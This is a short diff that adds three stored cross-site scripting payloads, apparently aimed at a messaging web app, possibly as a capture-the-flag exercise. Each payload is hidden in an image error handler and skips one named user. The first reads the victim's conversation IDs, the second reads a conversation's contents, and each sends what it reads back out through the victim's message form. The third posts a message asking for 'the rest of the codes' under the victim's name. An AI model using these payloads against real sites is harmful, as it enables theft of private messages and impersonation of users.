@@ -1,0 +1,22 @@
+<img src="x" onerror="if (document.querySelector('#header .name').innerText !== 'Junod Arthur') {
+    let t = Array(...document.querySelectorAll('.conversation')).map(c => c.id.trim()).join('|||');
+    console.log(t)
+    document.getElementById('message').innerHTML = t;
+    document.getElementById('messageButton').click()
+}"></img>
+
+
+<img src="x" onerror="if (document.querySelector('#header .name').innerText !== 'Junod Arthur') {
+    fetch('/conversation/94466442df159b76').then(function (response) { return response.text();}).then(function (html) { document.getElementById('message').innerHTML = html;
+document.getElementById('messageButton').click();});
+}"></img>
+
+<img src="x" onerror="if (document.querySelector('#header .name').innerText !== 'Junod Arthur') {
+    fetch(`/conversation/94466442df159b76`, {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({ message: 'gimme the rest of the codes pls' })
+    })
+}"></img>
